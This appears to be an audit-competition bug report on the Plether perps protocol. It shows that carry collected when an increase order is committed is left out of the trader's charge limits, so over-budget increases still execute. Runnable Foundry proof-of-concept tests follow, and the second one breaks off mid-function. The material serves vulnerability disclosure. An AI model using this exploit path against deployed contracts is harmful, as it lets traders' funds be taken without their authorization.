# \#98293 [SC-Low] Open-order carry checkpoint bypasses the trader's charge limits

**Submitted on Nov 6th 2026 at 19:11:40 UTC by @CarlosMB for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98293
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Executive Summary

Committing an open order checkpoints and collects carry owed by the trader's existing position. The Router then records the order as though no carry was collected. When the order executes, the opening-order policy checks only the later trade charge against Alice's stated financial limit. An increase can therefore execute even though the total charge across commitment and execution exceeds that limit. The [accounting specification](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L715-L724) requires direct carry collection to count once in financial bounds.

In the controlled PoC, Bob is a Junior LP and permissionless keeper. Alice commits an increase; Bob executes it and fully redeems his LP shares through public calls. A one-atom lower limit rejects the increase, while the bypass branch pays Bob 0.548347 USDG more wallet cash, with the same keeper bounty and no remaining shares. A separate same-mark test closes Alice's position through a later Alice-authored order: she finishes flat with 8.000102 USDG less than in the rejection control. Bob's cashout needs no second order from Alice; the measurement of her final, closed-position loss does.

### Four-step failure

1. Alice's existing 50,000-unit position owes 0.219630 USDG carry. She submits a 10,000-unit increase with `maxActionChargeAssets` = 9.488955 USDG. This cap covers carry, VPI and fees together.
2. Committing the increase collects that 0.219630 USDG from the old position, but stores zero as commitment carry. The new 10,000 units have not yet existed and owe no historical carry.
3. During the brief commit-to-execution interval, the old position accrues another 0.000002 USDG. At execution, the policy sees 9.488955 USDG of VPI, fee and that small carry amount. It accepts equality with Alice's cap.
4. The actual combined action charge is 0.219630 + 9.488955 = 9.708585 USDG, exceeding Alice's maximum by 0.219630 USDG. The same omission makes the gross debit 9.908585 USDG against a 9.688955 USDG gross cap.

| Financial limit | Alice's maximum | Amount checked at execution | Actual total from commitment through execution | Excess |
| --- | ---: | ---: | ---: | ---: |
| Action charge | 9.488955 | 9.488955 | 9.708585 | 0.219630 USDG |
| Gross account debit, including bounty | 9.688955 | 9.688955 | 9.908585 | 0.219630 USDG |

The old carry payment is legitimate and is not charged twice. The failure is executing the additional trade after its total charge has exceeded Alice's conditional authorization.

## Background

The [competition information](https://immunefi.com/audit-competition/plether/information/) pins the code in scope to the frozen commit above. [v2.0.0](https://github.com/Plether-Fi/plether-core/releases/tag/v2.0.0) is a verified public release containing the inspected V3 order flow. Alice is the trader and account owner. The public [commitOrder entry point, lines 127-135](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L127-L135) attributes an ordinary order to `msg.sender`, so Alice must commit it herself. Bob is a Junior LP and keeper; Carol is another Junior LP. The [scope notes](https://immunefi.com/audit-competition/plether/scope/) expressly allow anyone to act as a keeper.

### Documented property violated

[OrderV3Types.sol, line 131](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderV3Types.sol#L131-L134) calls the bounds “Mandatory financial authority supplied with every V3 order.” The [integration guide, line 103](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WORKING_WITH_AI_AGENTS.md#L102-L103) defines `maxActionChargeAssets` as the “Maximum assessed action charge after carry, signed virtual price impact (VPI), fees, and frozen spread are combined”; its adjacent line includes aggregate settlement debit and reserved bounty in `maxGrossAccountDebitAssets`. [ACCOUNTING_SPEC.md, line 723](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L723-L724) says “Receipts and financial bounds include the direct collection once.” [SECURITY.md, lines 756-765](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L756-L765) makes the maxima inclusive. The 0.219630 USDG carry collected at commitment is direct collection under that rule, yet the Book records zero and the opening execution check omits it. The checked total is therefore 9.488955 instead of 9.708585 USDG, contradicting both the combined-charge definition and the count-once requirement.

The tested setup starts by funding Alice with 100,000 USDG and opening a 50,000-unit LONG with 10,000 USDG margin. Carol deposits 900,000 USDG and Bob 100,000 into Junior; the fixture has no Senior LP. After one day at mark 1.00, Alice owes 0.219630 USDG of carry on her existing position. She submits one same-side increase of 10,000 units with 1,000 USDG additional margin. Bob already owns his LP shares before this order. The fixture uses the relevant [release risk and fee parameters](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L123-L143); its LP mix is a reproducible scenario, not a measured production distribution.

Carry itself is not the bug. It is an obligation of Alice's existing position and [collected carry is LP trading revenue](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L945-L974). The bug is that the protocol collects it while creating this financially bounded order, then lets the order execute as though that collection had never consumed Alice's limit.

## Vulnerability Details

### Commit and collect the old carry

[OrderReservationAccounting._reserveExecutionBounty, lines 108-127](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderReservationAccounting.sol#L108-L127) takes the opening-order branch, assigns only effects.bountyFromFreeAssets and calls clearinghouse.lockReservedSettlement. The returned effects still have carryCollectedAssets equal to zero. [MarginClearinghouse.lockReservedSettlement, lines 818-824](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L818-L824) first invokes _checkpointCarryBeforeMarginChange. Its [collection path, lines 1336-1355](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L1336-L1355) can transfer the old-position carry at this point. The PoC measures 0.219630 USDG collected at commitment.

### Record an incomplete commitment

[OrderCommitHandler._createPendingOrder, lines 21-35](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderCommitHandler.sol#L21-L35) passes those effects to [_onOrderCommitted in OrderRouterBase, lines 110-115](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderRouterBase.sol#L110-L115), which records them in the Book. [OrderLifecycleBook.recordCommitment, lines 327-359](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderLifecycleBook.sol#L327-L359) checks both bounds against the supplied effects.carryCollectedAssets and stores the same zero. Its internal balance consistency check cannot detect the earlier Clearinghouse debit because the supplied effects do not include that debit. A later margin reservation is another possible carry checkpoint; the PoC's observed collection occurs at the nonzero bounty reservation.

### Check the wrong total at execution

[CfdOrderPolicyEvaluator, lines 64-67](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluator.sol#L64-L67) calls _includeCommitment only for closes. For an increase, [CfdOrderPolicyEvaluatorBase, lines 340-348](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L340-L348) computes the charge from carry still pending at execution plus the new trade cost. The 0.219630 already collected is no longer pending and was not retained in the Book. [_includeCommitment, lines 474-486](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L474-L486) contains the operation that would add a commitment's carry once, but the opening branch does not invoke it. [_enforceBounds, lines 489-518](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L489-L518) therefore compares an incomplete charge with Alice's stated maxima.

The tested increase's 9.488955 USDG execution charge is 5.488953 positive opening VPI credited to the pool, 4.000000 fee credited to the treasury, and 0.000002 carry accrued on the pre-existing position between commitment and execution. Adding the 0.219630 USDG old-position carry collected at commitment produces 9.708585 USDG. The separate gross-debit control adds the 0.200000 USDG reserved execution bounty: the stated maximum is 9.688955, whereas the accumulated debit is 9.908585 USDG. The omitted old carry explains the exact 0.219630 excess in each limit. No one charges carry twice; the check fails to count an already-realized charge once.

## Exploitability Analysis

### One-atom authorization control

The one-atom control establishes execution outside Alice's authenticated financial limit. Restoring the same snapshot and changing only `maxActionChargeAssets` from 9.488954 to 9.488955 USDG changes the order from Failed to Executed. An independent `maxGrossAccountDebitAssets` control changes 9.688954 to 9.688955 with the same result. Both branches collect Alice's 0.219630 old carry and award the same 0.200000 bounty. The control shows that the difference is admission of the increase, not a carry waiver or an extra keeper payment.

### Public-entrypoint cashout and measured scaling

A separate Foundry fixture funds Junior LPs, settles their deposits, opens Alice's initial LONG, updates the mark, commits and executes her increase, settles Bob's redemption epoch and pays his full withdrawal through public protocol calls. Only token minting, time advances and the out-of-scope Pyth mock are fixture operations. Each scale restores the same snapshot and compares the action cap with that cap minus one USDG atom. At every tested scale the lower cap fails, the higher cap executes, Bob redeems 100% of his shares, and his keeper custody is equal across branches. Alice still owns the larger position after Bob's autonomous cashout, so her custody delta here is not a measured terminal loss.

| Public E2E fixture | Bob initial Junior stake | Old carry collected at commitment | Action cap that executes | Bob's extra wallet USDG after full exit | Alice custody difference; position still open |
| --- | ---: | ---: | ---: | ---: | ---: |
| 1×; 1,000,000 USDG Junior depth | 100,000 | 0.219632 | 9.488955 | +0.548347 | −9.488955 |
| 10×; 10,000,000 USDG Junior depth | 1,000,000 | 2.196326 | 94.988328 | +5.498283 | −94.988328 |
| 100×; 100,000,000 USDG Junior depth | 10,000,000 | 21.963267 | 949.982259 | +54.997676 | −949.982259 |

For the 100× fixture, the execution check admits 949.982259 USDG while the combined charge is 21.963267 + 949.982259 = 971.945526 USDG. Bob's actual wallet payout is 10,000,127.169723 USDG in the failed-order control and 10,000,182.167399 USDG after execution; his keeper-bounty custody is 0.400000 USDG in both. The 949.982259 custody difference reconciles as Bob wallet +54.997676, residual pool cash +494.984583 and treasury +400.000000. Carol's LP share valuation increases by 494.979083 but is not a withdrawn amount and must not be added again. The public E2E 1× fixture's old carry is 0.219632, two USDG atoms above the earlier 0.219630 example, because the public initial open and timing differ. These are code-scale results using minted MockUSDG and simulated 100 million USDG depth, not evidence that a deployed pool holds that liquidity or that Bob earned a 54.997676 USDG net profit after external costs.

### Closed-position counterfactual

A second test completes Alice's accounting with one sequence per branch: Alice commits the increase; Bob executes or the limit rejects it; Alice then independently commits a public full close of her resulting position; Bob executes it at mark 1.00; Bob redeems all his LP shares through the public Router. The second Alice order must close 50,000 units in the rejected branch and 60,000 in the executed branch, so that downstream request necessarily follows the position created by the first decision. Both branches end flat.

| Final state after Alice closes and Bob exits, mark 1.00 | Rejected control | Bypass executed | Bypass difference |
| --- | ---: | ---: | ---: |
| Alice custody; position zero | 99,959.580203 | 99,951.580101 | −8.000102 USDG |
| Bob wallet after redeeming 100% of shares | 100,001.245391 | 100,001.793738 | +0.548347 USDG |
| Bob keeper-bounty custody | 0.200000 | 0.200000 | 0 |
| Bob residual LP shares and claim | 0 | 0 | 0 |
| Carol LP share valuation, not withdrawn | 900,011.199404 | 900,016.134529 | +4.935125 USDG |
| Pool cash after paying Bob | 902,011.449297 | 902,016.389906 | +4.940609 USDG |
| Treasury custody | 27.525109 | 30.036255 | +2.511146 USDG |

The final 8.000102 USDG difference in Alice's custody reconciles as Bob wallet +0.548347 + residual pool cash +4.940609 + treasury +2.511146. Carol's LP share valuation is a claim on pool assets, not extra cash to add to that sum. With the same 100,000 USDG initial stake, Bob's wallet plus bounty custody is 100,001.445391 in the control and 100,001.993738 after the bypass, before external costs.

### Impact and severity

Alice's cap should prevent the entire increase, not merely the last 0.219630 USDG of its charge. The protocol nevertheless executes that financially unauthorized trade; Bob, an unrelated party who selects it for execution, converts part of the resulting pool revenue to USDG in his own wallet. The same-mark close scenario demonstrates that Alice can finish with a real, price-independent 8.000102 USDG loss while Bob retains his incremental withdrawal. This realized third-party payout from a financially unauthorized execution supports the proposed Critical direct-theft impact.

### Limits of the demonstrated impact

Alice submits the increase and must submit the later close; Bob cannot unilaterally create either. Positive opening VPI and fees are ordinary protocol revenue for a trade that executes. [ACCOUNTING_SPEC.md, lines 1055-1065](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L1055-L1065) makes a negative close rebate conditional on available cash, and no preview creates a guaranteed refund. Bob's no-close payout alone proves a realized transfer from pool revenue, while Alice still owns the enlarged position; Alice's terminal loss is demonstrated only when she later closes voluntarily. Gas, oracle expense, capital cost and exposure to price movement during the LP epoch were not measured. Immunefi may therefore classify the proven financial-bound violation as Medium user damage rather than Critical direct theft. The proposed Critical severity is supported by the realized cashout and closed-position loss, but it is not settled by these tests alone.

### Version and public-issue check

The frozen competition code and public [v2.0.0 release](https://github.com/Plether-Fi/plether-core/releases/tag/v2.0.0) contain this flow; the first affected and first fixed releases have not been established. [PR #124](https://github.com/Plether-Fi/plether-core/pull/124) prevents an early carry checkpoint when refunding a protection bounty before a manual close, a different path from reserving bounty for an ordinary increase. The published [Cecuro MED-22](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf#page=53) concerns carry rounding. No identical public disclosure was identified, though PR #124's conceptual overlap may be debated. The [competition rules](https://immunefi.com/audit-competition/plether/information/) invalidate public disclosures of the same root cause and keep private duplicates eligible.

## Proof of Concept

## Proof of Concept

These are the complete runnable Foundry test sources. Save each Solidity block verbatim at its stated path in a clean checkout of the competition commit. They use `BasePerpTest` and mocked out-of-scope inputs; no `packages/perps/src` contract is modified and no public-chain transaction is required. The public-entrypoint test distinguishes protocol calls from fixture minting, snapshots and clock advances.

### Test 1 — Public open, increase and full LP withdrawal

Save as: `packages/perps/test/perps/audit/AuditCarryPublicE2E.t.sol`. This test contains the 1×, 10× and 100× same-snapshot cap controls and Bob's fully claimed LP exit.

~~~solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";

/// @notice Public-path E2E audit probe. Token mint and time warp are fixture setup only.
contract AuditCarryPublicE2E is BasePerpTest {
    address private constant ALICE = address(0x111);
    address private constant BOB = address(0x222);
    address private constant CAROL = address(0x333);

    function _initialJuniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialSeniorDeposit() internal pure override returns (uint256) { return 0; }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5_000,
            protocolShareBps: 0
        });
    }

    struct Outcome {
        uint8 status;
        uint8 reason;
        uint256 sizeAfterExecution;
        uint256 aliceCustodyAfterExecution;
        uint256 aliceCustodyAfterClaim;
        uint256 bobWalletAfterClaim;
        uint256 bobKeeperCustodyAfterClaim;
        uint256 bobSharesAfterClaim;
        uint256 carolLpClaimAfterClaim;
        uint256 poolCashAfterClaim;
        uint256 treasuryAfterClaim;
    }

    function test_OneXPublicInitialOpenIncreaseAndFullLpCashout() public {
        _runScale(1);
    }

    function test_TenXPublicInitialOpenIncreaseAndFullLpCashout() public {
        _runScale(10);
    }

    function test_HundredXPublicInitialOpenIncreaseAndFullLpCashout() public {
        _runScale(100);
    }

    function _runScale(uint256 scale) private {
        _fundJuniorPublic(CAROL, 900_000e6 * scale);
        _fundJuniorPublic(BOB, 100_000e6 * scale);
        _fundTrader(ALICE, 100_000e6 * scale);

        OrderV3Types.OrderRequest memory initial = _openRequest(
            keccak256("public-initial-open"), 50_000e18 * scale, 10_000e6 * scale, type(uint256).max
        );
        vm.prank(ALICE);
        uint64 initialId = router.commitOrder(initial);
        bytes[] memory initialPriceData = _mockPythUpdateData(1e8);
        vm.prank(BOB);
        OrderV3Types.ExecutionResult memory initialExecution = router.executeOrder(initialId, initialPriceData);
        assertEq(uint8(initialExecution.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        (uint256 initialSize,,,,,,) = engine.positions(ALICE);
        assertEq(initialSize, 50_000e18 * scale);

        vm.warp(vm.getBlockTimestamp() + 1 days);
        router.updateMarkPrice(_mockPythUpdateData(1e8));
        uint256 oldCarry = _expectedIndexedCarryAssets(ALICE);
        ICfdEngineTypes.OpenPreview memory quote = engineLens.previewOpen(
            ALICE, CfdTypes.Side.LONG, 10_000e18 * scale, 1_000e6 * scale, 1e8
        );
        emit log_named_uint("scale", scale);
        emit log_named_uint("old carry", oldCarry);
        emit log_named_uint("preview invalid reason", uint8(quote.invalidReason));
        assertTrue(quote.valid, "scaled increase must be planner valid");
        assertGt(oldCarry, 0);
        assertGt(quote.tradeCostAssets, 0);
        uint256 reportedCharge = _calibrateNextExecutionCharge(scale);
        emit log_named_uint("pre-commit trade cost", uint256(quote.tradeCostAssets));
        emit log_named_uint("reported action charge", reportedCharge);
        emit log_named_uint("preview VPI charge", uint256(quote.vpiAssets));
        emit log_named_uint("preview execution fee", quote.executionFeeAssets);
        uint256 bobShares = juniorVault.balanceOf(BOB);
        uint256 snapshot = vm.snapshotState();

        Outcome memory rejected = _runBranch(scale, reportedCharge - 1, bobShares);
        assertEq(rejected.status, uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(rejected.reason, uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        assertEq(rejected.sizeAfterExecution, 50_000e18 * scale);
        assertEq(rejected.bobSharesAfterClaim, 0);

        assertTrue(vm.revertToState(snapshot));
        Outcome memory bypass = _runBranch(scale, reportedCharge, bobShares);
        assertEq(bypass.status, uint8(OrderV3Types.LifecycleStatus.Executed));
        assertEq(bypass.reason, uint8(OrderV3Types.TerminalReason.Executed));
        assertEq(bypass.sizeAfterExecution, 60_000e18 * scale);
        assertEq(bypass.bobSharesAfterClaim, 0);
        assertGt(bypass.bobWalletAfterClaim, rejected.bobWalletAfterClaim);
        assertEq(bypass.bobKeeperCustodyAfterClaim, rejected.bobKeeperCustodyAfterClaim);
        assertEq(rejected.aliceCustodyAfterClaim - bypass.aliceCustodyAfterClaim, reportedCharge);

        emit log_named_uint("Bob LP stake", 100_000e6 * scale);
        emit log_named_uint("Carol LP stake", 900_000e6 * scale);
        emit log_named_uint("Bob control wallet after full cashout", rejected.bobWalletAfterClaim);
        emit log_named_uint("Bob bypass wallet after full cashout", bypass.bobWalletAfterClaim);
        emit log_named_uint("Bob incremental realized wallet", bypass.bobWalletAfterClaim - rejected.bobWalletAfterClaim);
        emit log_named_uint("Bob control keeper custody", rejected.bobKeeperCustodyAfterClaim);
        emit log_named_uint("Bob bypass keeper custody", bypass.bobKeeperCustodyAfterClaim);
        emit log_named_uint("Alice control custody", rejected.aliceCustodyAfterClaim);
        emit log_named_uint("Alice bypass custody", bypass.aliceCustodyAfterClaim);
        emit log_named_uint("Carol control LP claim preview", rejected.carolLpClaimAfterClaim);
        emit log_named_uint("Carol bypass LP claim preview", bypass.carolLpClaimAfterClaim);
        emit log_named_uint("pool control cash", rejected.poolCashAfterClaim);
        emit log_named_uint("pool bypass cash", bypass.poolCashAfterClaim);
        emit log_named_uint("treasury control custody", rejected.treasuryAfterClaim);
        emit log_named_uint("treasury bypass custody", bypass.treasuryAfterClaim);
    }

    /// @dev Test-only reverted calibration: a temporary permissive commit and next-second
    ///      view are reverted before the same-snapshot one-atom control branches begin.
    function _calibrateNextExecutionCharge(uint256 scale) private returns (uint256 charge) {
        uint256 calibrationSnapshot = vm.snapshotState();
        OrderV3Types.OrderRequest memory probe = _openRequest(
            keccak256("temporary-charge-calibration"), 10_000e18 * scale, 1_000e6 * scale, type(uint256).max
        );
        vm.prank(ALICE);
        router.commitOrder(probe);
        _mockPythUpdateData(1e8);
        ICfdEngineTypes.OpenPreview memory executionQuote = engineLens.previewOpen(
            ALICE, CfdTypes.Side.LONG, 10_000e18 * scale, 1_000e6 * scale, 1e8
        );
        assertTrue(executionQuote.valid);
        assertGt(executionQuote.tradeCostAssets, 0);
        charge = uint256(executionQuote.tradeCostAssets) + executionQuote.pendingCarryAssets;
        emit log_named_uint("post-commit one-second carry", executionQuote.pendingCarryAssets);
        assertTrue(vm.revertToState(calibrationSnapshot));
    }

    function _fundJuniorPublic(address lp, uint256 amount) private {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), amount);
        uint256 requestId = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        vm.warp(juniorVault.depositEpochStart(requestId));
        bytes[] memory settlePriceData = _mockPythUpdateData(1e8);
        vm.prank(BOB);
        router.settleLpEpoch(settlePriceData);
        uint256 claimableAssets = juniorVault.claimableDepositRequest(requestId, lp);
        assertEq(claimableAssets, amount);
        vm.prank(lp);
        juniorVault.claimDeposit(requestId, claimableAssets, lp, lp);
    }

    function _runBranch(uint256 scale, uint256 maxActionChargeAssets, uint256 bobShares)
        private returns (Outcome memory out)
    {
        OrderV3Types.OrderRequest memory increase = _openRequest(
            keccak256("public-increase"), 10_000e18 * scale, 1_000e6 * scale, maxActionChargeAssets
        );
        vm.prank(ALICE);
        uint64 id = router.commitOrder(increase);
        assertEq(router.lifecycleBook().pendingIntent(id).commitment.carryCollectedAssets, 0);
        bytes[] memory executePriceData = _mockPythUpdateData(1e8);
        vm.prank(BOB);
        OrderV3Types.ExecutionResult memory execution = router.executeOrder(id, executePriceData);
        out.status = uint8(execution.status);
        out.reason = uint8(router.lifecycleBook().terminalOutcome(id).reason);
        (out.sizeAfterExecution,,,,,,) = engine.positions(ALICE);
        out.aliceCustodyAfterExecution = clearinghouse.balanceAssets(ALICE);

        vm.prank(BOB);
        uint256 redeemId = juniorVault.requestRedeem(bobShares, BOB, BOB);
        vm.warp(pool.lpEpochStart(redeemId));
        bytes[] memory settlePriceData = _mockPythUpdateData(1e8);
        vm.prank(BOB);
        router.settleLpEpoch(settlePriceData);
        uint256 claimableShares = juniorVault.claimableRedeemRequest(redeemId, BOB);
        assertEq(claimableShares, bobShares);
        vm.prank(BOB);
        juniorVault.claimRedeem(redeemId, claimableShares, BOB, BOB);

        out.aliceCustodyAfterClaim = clearinghouse.balanceAssets(ALICE);
        out.bobWalletAfterClaim = settlementToken.balanceOf(BOB);
        out.bobKeeperCustodyAfterClaim = clearinghouse.balanceAssets(BOB);
        out.bobSharesAfterClaim = juniorVault.balanceOf(BOB);
        out.carolLpClaimAfterClaim = juniorVault.convertToAssets(juniorVault.balanceOf(CAROL));
        out.poolCashAfterClaim = pool.totalAssets();
        out.treasuryAfterClaim = clearinghouse.balanceAssets(engine.protocolTreasury());
    }

    function _openRequest(bytes32 clientId, uint256 size, uint256 margin, uint256 maxActionCharge)
        private view returns (OrderV3Types.OrderRequest memory request)
    {
        request.clientOrderId = clientId;
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = 1e8;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: maxActionCharge,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }
}
~~~

### Test 2 — One-atom action and gross-debit limits

Save as: `packages/perps/test/perps/audit/AuditCarryOneAtomThreshold.t.sol`. This test isolates both inclusive financial limits and the old-position carry omitted from the opening check.

~~~solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";

contract AuditCarryOneAtomThreshold is BasePerpTest {
    address private constant TRADER = address(0x111);
    address private constant LP = address(0x222);
    address private constant KEEPER = address(0x333);

    function _initialJuniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialSeniorDeposit() internal pure override returns (uint256) { return 0; }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5_000,
            protocolShareBps: 0
        });
    }

    function test_OneAtomCapDifferenceExecutesOverBudgetIncrease() public {
        _fundJunior(LP, 1_000_000e6);
        _fundTrader(TRADER, 100_000e6);
        _open(TRADER, CfdTypes.Side.LONG, 50_000e18, 10_000e6, 1e8);
        vm.warp(block.timestamp + 1 days);
        vm.prank(address(router));
        engine.updateMarkPrice(1e8, uint64(block.timestamp));

        uint256 due = _expectedIndexedCarryAssets(TRADER);
        assertEq(due, 219_630);
        uint256 beforeCustody = clearinghouse.balanceAssets(TRADER);
        uint256 checkpoint = vm.snapshotState();

        Snapshot memory rejected = _run(9_488_954, type(uint256).max);
        assertEq(uint8(rejected.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(rejected.positionSize, 50_000e18);

        assertTrue(vm.revertToState(checkpoint));
        Snapshot memory overBudget = _run(9_488_955, type(uint256).max);
        assertEq(uint8(overBudget.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        assertEq(overBudget.positionSize, 60_000e18);

        // Commit carry and bounty are paid in both branches. The accepted one-atom
        // higher bound additionally executes an increase whose cumulative action
        // charge actually exceeds the signed maximum by the prior carry amount.
        assertEq(overBudget.keeperCustody, rejected.keeperCustody);
        assertEq(rejected.traderCustody - overBudget.traderCustody, 9_488_955);
        assertEq(overBudget.poolCash - rejected.poolCash, 5_488_955);
        assertEq(overBudget.treasuryCustody - rejected.treasuryCustody, 4e6);
        assertEq(overBudget.bobClaimAssets - rejected.bobClaimAssets
            + overBudget.seedJuniorClaimAssets - rejected.seedJuniorClaimAssets
            + overBudget.seedSeniorClaimAssets - rejected.seedSeniorClaimAssets,
            overBudget.poolCash - rejected.poolCash);

        assertTrue(vm.revertToState(checkpoint));
        Snapshot memory grossRejected = _run(type(uint256).max, 9_688_954);
        assertEq(uint8(grossRejected.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(grossRejected.positionSize, 50_000e18);
        assertTrue(vm.revertToState(checkpoint));
        Snapshot memory grossOverBudget = _run(type(uint256).max, 9_688_955);
        assertEq(uint8(grossOverBudget.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        assertEq(grossOverBudget.positionSize, 60_000e18);
        assertEq(keccak256(abi.encode(rejected)), keccak256(abi.encode(grossRejected)));
        assertEq(keccak256(abi.encode(overBudget)), keccak256(abi.encode(grossOverBudget)));
        assertEq(beforeCustody - grossOverBudget.traderCustody, 9_908_585);
        assertGt(beforeCustody - grossOverBudget.traderCustody, 9_688_955);

        emit log_named_uint("carry owed before both commits", due);
        emit log_named_uint("failed bound", 9_488_954);
        emit log_named_uint("executed bound", 9_488_955);
        emit log_named_uint("failed gross bound", 9_688_954);
        emit log_named_uint("executed gross bound", 9_688_955);
        emit log_named_uint("gross actual trader debit", beforeCustody - grossOverBudget.traderCustody);
        emit log_named_uint("trader custody rejected", rejected.traderCustody);
        emit log_named_uint("trader custody executed", overBudget.traderCustody);
        emit log_named_uint("pool rejected", rejected.poolCash);
        emit log_named_uint("pool executed", overBudget.poolCash);
        emit log_named_uint("treasury rejected", rejected.treasuryCustody);
        emit log_named_uint("treasury executed", overBudget.treasuryCustody);
        emit log_named_uint("keeper rejected", rejected.keeperCustody);
        emit log_named_uint("keeper executed", overBudget.keeperCustody);
    }

    struct Snapshot {
        OrderV3Types.LifecycleStatus status;
        uint256 traderCustody;
        uint256 keeperCustody;
        uint256 treasuryCustody;
        uint256 poolCash;
        uint256 positionSize;
        uint256 bobClaimAssets;
        uint256 seedJuniorClaimAssets;
        uint256 seedSeniorClaimAssets;
    }

    function _run(uint256 actionCap, uint256 grossCap) private returns (Snapshot memory result) {
        OrderV3Types.OrderRequest memory request = _request(actionCap, grossCap);
        vm.prank(TRADER);
        uint64 id = router.commitOrder(request);
        assertEq(router.lifecycleBook().pendingIntent(id).commitment.carryCollectedAssets, 0);
        bytes[] memory priceData = _mockPythUpdateData(1e8);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory execution = router.executeOrder(id, priceData);
        result.status = execution.status;
        result.traderCustody = clearinghouse.balanceAssets(TRADER);
        result.keeperCustody = clearinghouse.balanceAssets(KEEPER);
